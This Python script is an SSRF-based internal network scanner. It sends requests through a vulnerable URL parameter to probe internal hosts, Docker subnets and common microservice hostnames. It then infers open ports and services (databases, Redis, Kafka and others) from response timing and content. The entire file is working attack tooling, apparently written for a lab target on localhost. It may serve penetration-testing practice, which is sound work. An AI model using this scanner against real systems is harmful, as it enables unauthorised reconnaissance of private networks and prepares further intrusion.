"""
Internal Port Scanner via SSRF
Scan internal network through SSRF vulnerability
"""

import requests
import time
from typing import List, Dict, Set
from concurrent.futures import ThreadPoolExecutor, as_completed

class InternalScanner:
    """Scanner để scan internal network qua SSRF"""
    
    # Common ports cho microservices
    COMMON_PORTS = [
        80, 443, 8080, 8081, 8082, 8083, 8084, 8085,  # HTTP services
        5432, 5433, 3306, 3307, 27017,  # Databases
        6379, 11211,  # Cache (Redis, Memcached)
        9200, 9300,  # Elasticsearch
        5672, 15672,  # RabbitMQ
        2181,  # Zookeeper
        9092,  # Kafka
        8500,  # Consul
        50070,  # Hadoop
    ]
    
    # Docker network common ranges
    DOCKER_RANGES = [
        '172.17.0.0/16',  # Default bridge
        '172.18.0.0/16',  # Custom networks
        '172.19.0.0/16',
        '10.0.0.0/8',  # Private range
        '192.168.0.0/16'  # Private range
    ]
    
    def __init__(self, ssrf_url: str, ssrf_param: str, timeout: int = 5):
        self.ssrf_url = ssrf_url
        self.ssrf_param = ssrf_param
        self.timeout = timeout
        self.session = requests.Session()
        self.open_ports = []
    
    def scan_port(self, host: str, port: int) -> Dict:
        """
        Scan một port cụ thể qua SSRF
        
        Returns timing và status để detect port state
        """
        target = f"http://{host}:{port}"
        payload_url = f"{self.ssrf_url}?{self.ssrf_param}={target}"
        
        try:
            start_time = time.time()
            response = self.session.get(payload_url, timeout=self.timeout)
            elapsed = time.time() - start_time
            
            # Analyze response
            is_open = self._analyze_response(response, elapsed, port)
            
            if is_open:
                return {
                    'host': host,
                    'port': port,
                    'status': 'open',
                    'response_time': elapsed,
                    'response_code': response.status_code,
                    'service': self._guess_service(port, response)
                }
        
        except requests.exceptions.Timeout:
            # Timeout might indicate port is filtered or open but slow
            return {
                'host': host,
                'port': port,
                'status': 'timeout',
                'response_time': self.timeout
            }
        
        except Exception as e:
            # Connection errors might indicate closed port
            return {
                'host': host,
                'port': port,
                'status': 'closed',
                'error': str(e)
            }
        
        return {
            'host': host,
            'port': port,
            'status': 'closed'
        }
    
    def _analyze_response(self, response, elapsed: float, port: int) -> bool:
        """Phân tích response để xác định port state"""
        # Fast response thường = open port
        if elapsed < 1.0:
            return True
        
        # Check HTTP-specific indicators
        if response.status_code != 500:  # 500 thường = connection refused
            return True
        
        # Check response content
        content = response.text.lower()
        open_indicators = ['connection established', 'http', 'html']
        closed_indicators = ['connection refused', 'timeout', 'unreachable']
        
        for indicator in open_indicators:
            if indicator in content:
                return True
        
        for indicator in closed_indicators:
            if indicator in content:
                return False
        
        return False
    
    def _guess_service(self, port: int, response) -> str:
        """Đoán service type dựa trên port và response"""
        service_map = {
            80: 'HTTP', 443: 'HTTPS',
            8080: 'HTTP-Alt', 8081: 'HTTP-Service', 8082: 'HTTP-Service',
            5432: 'PostgreSQL', 3306: 'MySQL', 27017: 'MongoDB',
            6379: 'Redis', 11211: 'Memcached',
            9200: 'Elasticsearch',
            5672: 'RabbitMQ'
        }
        
        service = service_map.get(port, f'Unknown-{port}')
        
        # Refine based on response
        if response.status_code == 200:
            content = response.text.lower()
            if 'postgres' in content:
                service = 'PostgreSQL'
            elif 'mysql' in content:
                service = 'MySQL'
            elif 'redis' in content:
                service = 'Redis'
        
        return service
    
    def scan_host(self, host: str, ports: List[int] = None) -> List[Dict]:
        """Scan tất cả ports trên một host"""
        if ports is None:
            ports = self.COMMON_PORTS
        
        print(f"[*] Scanning {host} for {len(ports)} ports...")
        results = []
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = {
                executor.submit(self.scan_port, host, port): port 
                for port in ports
            }
            
            for i, future in enumerate(as_completed(futures)):
                result = future.result()
                if result['status'] == 'open':
                    results.append(result)
                    print(f"[+] {host}:{result['port']} - {result['service']} OPEN")
                
                # Progress
                if (i + 1) % 10 == 0:
                    print(f"[*] Progress: {i + 1}/{len(ports)}")
        
        return results
    
    def scan_network(self, ip_prefix: str, last_octet_range: range = range(2, 20)) -> List[Dict]:
        """
        Scan một dải network (ví dụ 172.18.0.X)
        
        Args:
            ip_prefix: "172.18.0"
            last_octet_range: range(2, 20) để scan .2 đến .19
        """
        all_results = []
        
        print(f"[*] Scanning network {ip_prefix}.0/24")
        print(f"[*] IP range: {ip_prefix}.{last_octet_range.start}-{last_octet_range.stop-1}")
        
        for last_octet in last_octet_range:
            host = f"{ip_prefix}.{last_octet}"
            print(f"\n[*] Scanning host: {host}")
            
            results = self.scan_host(host, ports=[80, 8080, 8081, 8082, 8083, 5432])
            all_results.extend(results)
            
            if results:
                print(f"[+] Found {len(results)} open ports on {host}")
        
        return all_results
    
    def discover_services(self) -> List[Dict]:
        """
        Smart discovery - scan common Docker networks
        """
        discovered_services = []
        
        # Common Docker network IPs
        common_ips = [
            'localhost',
            '127.0.0.1',
            '172.17.0.1',  # Default bridge gateway
            '172.18.0.1',  # Custom network gateway
        ]
        
        # Common service hostnames in Docker
        common_hostnames = [
            'user-service', 'product-service', 'inventory-service',
            'auth-service', 'api-gateway', 'database', 'db',
            'postgres', 'mysql', 'redis', 'mongodb',
            'rabbitmq', 'kafka', 'elasticsearch'
        ]
        
        print("[*] Phase 1: Scanning common IPs...")
        for ip in common_ips:
            results = self.scan_host(ip, ports=self.COMMON_PORTS[:15])
            discovered_services.extend(results)
        
        print("\n[*] Phase 2: Scanning common hostnames...")
        for hostname in common_hostnames:
            results = self.scan_host(hostname, ports=[80, 8080, 8081, 8082, 8083, 5432, 3306])
            discovered_services.extend(results)
        
        return discovered_services
    
    def get_summary(self) -> Dict:
        """Summary của scan results"""
        return {
            'total_open_ports': len(self.open_ports),
            'unique_hosts': len(set(r['host'] for r in self.open_ports)),
            'services_found': [
                f"{r['host']}:{r['port']} ({r['service']})" 
                for r in self.open_ports
            ]
        }

if __name__ == "__main__":
    # Test
    scanner = InternalScanner(
        ssrf_url="http://localhost:8083/inventory/1/M",
        ssrf_param="callback_url"
    )
    
    # Scan specific host
    results = scanner.scan_host("172.18.0.2", ports=[8080, 8081, 8082, 5432])
    
    print("\n" + "="*60)
    print(f"Found {len(results)} open ports:")
    for r in results:
        print(f"  {r['host']}:{r['port']} - {r['service']}")
